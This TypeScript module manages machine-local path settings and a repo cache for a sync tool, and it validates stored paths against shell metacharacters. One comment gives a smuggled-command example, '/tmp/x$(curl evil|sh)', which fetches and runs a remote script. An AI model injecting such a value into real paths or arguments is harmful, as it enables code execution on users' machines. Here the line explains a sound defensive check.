/**
 * Per-machine settings (#1950): `~/.oss-autopilot/local-config.json`.
 *
 * The synced state document is shared by every machine through the Gist, so a
 * filesystem path stored there is overwritten by whichever machine wrote
 * last. The curated list path, the skipped-issues path, the local repo scan
 * roots (#2010) and the local repo cache live here instead. Like
 * `machine-id`, the file is outside `state.json`, so no sync path ever
 * carries it.
 *
 * Transition: the synced keys (`config.issueListPath`,
 * `config.skippedIssuesPath`, `config.localRepoScanPaths`, `localRepoCache`)
 * stay in the schema and are still read as a fallback, so a machine that has
 * not set a local value behaves as before. New clients write path settings here only; a synced
 * value is copied here the first time it is read and found on this machine's
 * disk, and is never adopted when it is not.
 */

import * as fs from 'node:fs';
import * as os from 'node:os';
import path from 'node:path';
import { z } from 'zod';
import { getLocalConfigPath } from './paths.js';
import { atomicWriteFileSync } from './state-persistence.js';
import { preserveRejected } from './stale-data.js';
import { LocalRepoCacheSchema, type LocalRepoCache } from './state-schema.js';
import { errorMessage, ValidationError } from './errors.js';
import { warn } from './logger.js';

const MODULE = 'local-config';

/** Config keys whose value is a filesystem path on one machine. */
export const MACHINE_PATH_KEYS = ['issueListPath', 'skippedIssuesPath'] as const;
export type MachinePathKey = (typeof MACHINE_PATH_KEYS)[number];

/** The synced values the accessors fall back to (a slice of `state.config`). */
export type SyncedPaths = Partial<Record<MachinePathKey, string>>;

/**
 * How a stored path got into the local file: `set` by the user (`setup --set`,
 * `config`), `adopted` from the synced config because it exists on this
 * machine, or found by a `probe` (the `skipped-issues.md` next to the list;
 * an older build also stored current-directory list probes, #1933).
 */
export type MachinePathSource = 'set' | 'adopted' | 'probe';

// An empty `path` records "cleared on this machine", so the synced value does
// not come back after `setup --set issueListPath=`. A bare string is the
// shape written before the source was recorded; it loads as `set`.
const StoredPathSchema = z.union([
  z.string(),
  z.object({ path: z.string(), source: z.enum(['set', 'adopted', 'probe']) }),
]);

export type ScanPathsSource = 'set' | 'adopted';

// A bare array is a hand edit; it loads as `set`. A malformed value only
// drops this key (with a warning), not the whole file.
const ScanPathsShape = z.object({ paths: z.array(z.string()), source: z.enum(['set', 'adopted']) });
const StoredScanPathsSchema = z
  .union([z.array(z.string()), ScanPathsShape])
  .optional()
  .catch((ctx) => {
    const problems = ctx.issues.map((issue) => issue.message).join('; ');
    warn(MODULE, `Ignoring malformed localRepoScanPaths in local-config.json (${problems})`);
  });

const LocalConfigSchema = z.looseObject({
  issueListPath: StoredPathSchema.optional(),
  skippedIssuesPath: StoredPathSchema.optional(),
  localRepoScanPaths: StoredScanPathsSchema,
  localRepoCache: LocalRepoCacheSchema.optional(),
});

type LocalConfig = z.infer<typeof LocalConfigSchema>;

/**
 * Move a file that cannot be parsed out of the way, so the next write does
 * not overwrite what the user had. Returns a note for the warning.
 */
function setAsideUnreadable(filePath: string): string {
  try {
    return `kept as ${preserveRejected(filePath, 'move')}`;
  } catch (err) {
    return `could not be set aside (${errorMessage(err)})`;
  }
}

/** The stored file, or `{}` when it is missing or unreadable (with a warning). */
function readLocalConfig(): LocalConfig {
  const filePath = getLocalConfigPath();
  if (!fs.existsSync(filePath)) return {};
  try {
    return LocalConfigSchema.parse(JSON.parse(fs.readFileSync(filePath, 'utf8')));
  } catch (err) {
    warn(MODULE, `Ignoring unreadable ${filePath} (${errorMessage(err)}); it ${setAsideUnreadable(filePath)}`);
    return {};
  }
}

/** The stored entry for a key in its current shape, or undefined when none is stored. */
function readStoredPath(key: MachinePathKey): { path: string; source: MachinePathSource } | undefined {
  const stored = readLocalConfig()[key];
  return typeof stored === 'string' ? { path: stored, source: 'set' } : stored;
}

// ponytail: read-modify-write with no lock. Two processes setting different
// keys at once can lose one write; the next detection or `setup --set`
// rewrites it. Take the state lock here if that ever shows up.
function updateLocalConfig(patch: Partial<LocalConfig>): void {
  const next = { ...readLocalConfig(), ...patch };
  atomicWriteFileSync(getLocalConfigPath(), `${JSON.stringify(next, null, 2)}\n`, 0o600);
}

/** Best-effort copy of a synced value into the local file; the caller still has the value. */
function adopt(patch: Partial<LocalConfig>): void {
  try {
    updateLocalConfig(patch);
  } catch (err) {
    warn(MODULE, `Could not save machine-local settings: ${errorMessage(err)}`);
  }
}

/** True for an absolute path to a regular file on this machine's disk. */
function isFileHere(candidate: string): boolean {
  return path.isAbsolute(candidate) && fs.statSync(candidate, { throwIfNoEntry: false })?.isFile() === true;
}

/**
 * This machine's value for a path setting.
 *
 * The local value wins. With none, the synced value is returned unchanged
 * (callers already handle a path that is not on disk), and it is copied to
 * the local file when it is an absolute path to a regular file here, so a
 * later write from another machine cannot replace it.
 */
export function getMachinePath(key: MachinePathKey, synced: SyncedPaths): string | undefined {
  const local = readStoredPath(key);
  if (local) return local.path || undefined;
  const syncedValue = synced[key];
  // A synced value with a shell metacharacter (written by an older client) is
  // never adopted into the local file.
  if (syncedValue && isFileHere(syncedValue) && !SHELL_UNSAFE_PATH.test(syncedValue)) {
    adopt({ [key]: { path: syncedValue, source: 'adopted' } });
  }
  return syncedValue;
}

/**
 * Where the value {@link getMachinePath} returns comes from: the source
 * recorded with the local value, `synced` when there is no local value and
 * the shared config supplies one, or undefined when nothing is configured.
 */
export function getMachinePathSource(
  key: MachinePathKey,
  synced: SyncedPaths,
): MachinePathSource | 'synced' | undefined {
  const local = readStoredPath(key);
  if (local) return local.source;
  const syncedValue = synced[key];
  return syncedValue ? 'synced' : undefined;
}

// The characters still active inside a double-quoted shell word: $ ` " \
// and line breaks. No workflow interpolates a stored path any more; this
// keeps a validated path safe inside double quotes regardless, so a value
// like `/tmp/x$(curl evil|sh)` written over MCP cannot run. ' & ; | < > are
// allowed: real paths use them ("John's Vault", "Notes & Docs").
const SHELL_UNSAFE_PATH = /[$`"\\\n\r]/;

/**
 * Throw when a path setting contains a character a shell still interprets
 * inside double quotes ($ ` " \, a line break or NUL). Checked on every
 * write, CLI and MCP alike.
 */
export function assertSafeMachinePath(key: string, value: string): void {
  if (SHELL_UNSAFE_PATH.test(value) || value.includes('\0')) {
    throw new ValidationError(`Invalid value for ${key}: a path may not contain $ \` " \\, a line break or NUL.`);
  }
}

/**
 * Set (or, with `undefined` or an empty string, clear) a path setting for
 * this machine only, recording how the value was obtained. A relative value
 * is stored resolved against the current directory (#1933), so it never
 * depends on where a later command runs. Returns what was stored.
 *
 * @throws ValidationError when the path contains a shell metacharacter.
 */
export function setMachinePath(key: MachinePathKey, value = '', source: MachinePathSource = 'set'): string {
  assertSafeMachinePath(key, value);
  const stored = value && path.resolve(value);
  updateLocalConfig({ [key]: { path: stored, source } });
  return stored;
}

/** `~/x` with the home directory expanded; anything else unchanged. */
function expandHome(entry: string): string {
  return entry === '~' || entry.startsWith('~/') ? path.join(os.homedir(), entry.slice(1)) : entry;
}

/** True for an absolute, shell-safe path to a directory on this machine's disk. */
function isSafeDirHere(candidate: string): boolean {
  return (
    path.isAbsolute(candidate) &&
    !SHELL_UNSAFE_PATH.test(candidate) &&
    !candidate.includes('\0') &&
    fs.statSync(candidate, { throwIfNoEntry: false })?.isDirectory() === true
  );
}

/**
 * The stored local entries as scan roots: `~/` expanded, relative or unsafe
 * entries skipped (a hand edit cannot depend on the current directory), and
 * a warning for an entry that is not on disk (the scan skips it).
 */
function usableScanPaths(entries: string[]): string[] {
  const usable: string[] = [];
  for (const raw of entries) {
    const entry = expandHome(raw);
    if (!path.isAbsolute(entry) || SHELL_UNSAFE_PATH.test(entry) || entry.includes('\0')) {
      warn(MODULE, `Skipping localRepoScanPaths entry "${raw}": not an absolute, shell-safe path`);
      continue;
    }
    if (!fs.existsSync(entry)) warn(MODULE, `localRepoScanPaths entry ${entry} does not exist on this machine`);
    usable.push(entry);
  }
  return usable;
}

/**
 * This machine's repo scan roots (#2010) and how they got there, or undefined
 * to use the defaults.
 *
 * A stored local value wins, even an empty one (`setup --set
 * localRepoScanPaths=`), which means "use the defaults". With none, a synced
 * list is adopted (copied to the local file) only when every entry is an
 * absolute, shell-safe directory here; otherwise it was written for another
 * machine and is ignored.
 */
export function getMachineScanPaths(
  synced: string[] | undefined,
): { paths: string[]; source: ScanPathsSource } | undefined {
  const stored = readLocalConfig().localRepoScanPaths;
  if (stored) {
    const local = Array.isArray(stored) ? { paths: stored, source: 'set' as const } : stored;
    const paths = usableScanPaths(local.paths);
    return paths.length > 0 ? { paths, source: local.source } : undefined;
  }
  if (!synced?.length || synced.some((entry) => !isSafeDirHere(entry))) return undefined;
  adopt({ localRepoScanPaths: { paths: synced, source: 'adopted' } });
  return { paths: synced, source: 'adopted' };
}

/**
 * Set this machine's scan roots from a comma-separated list. Entries are
 * trimmed, `~/` is expanded and relative entries resolve against the current
 * directory. An empty list clears them, so the defaults apply. Returns what
 * was stored.
 *
 * @throws ValidationError when an entry contains a shell metacharacter.
 */
export function setMachineScanPaths(value: string): string[] {
  const paths = value
    .split(',')
    .map((entry) => entry.trim())
    .filter(Boolean)
    .map((entry) => {
      assertSafeMachinePath('localRepoScanPaths', entry);
      return path.resolve(expandHome(entry));
    });
  updateLocalConfig({ localRepoScanPaths: { paths, source: 'set' } });
  return paths;
}

/** The cache with only the repos whose checkout is on this machine's disk. */
function withExistingRepos(cache: LocalRepoCache): LocalRepoCache {
  const repos: LocalRepoCache['repos'] = {};
  for (const [name, info] of Object.entries(cache.repos)) {
    if (fs.existsSync(info.path)) repos[name] = info;
  }
  return { ...cache, repos };
}

/**
 * This machine's local repo cache, or undefined when a scan is needed.
 *
 * Entries whose path is gone are dropped on every read (the file itself is
 * rewritten by the next scan). A synced cache left by an older client is
 * adopted once, minus the entries that are not on this disk, and is ignored
 * when none of its repos are here: it was written by another machine.
 */
export function getMachineRepoCache(synced: LocalRepoCache | undefined): LocalRepoCache | undefined {
  const local = readLocalConfig().localRepoCache;
  if (local) return withExistingRepos(local);
  if (!synced) return undefined;
  const here = withExistingRepos(synced);
  if (Object.keys(synced.repos).length > 0 && Object.keys(here.repos).length === 0) return undefined;
  adopt({ localRepoCache: here });
  return here;
}

/** Store a fresh scan for this machine only. */
export function setMachineRepoCache(cache: LocalRepoCache): void {
  updateLocalConfig({ localRepoCache: cache });
}
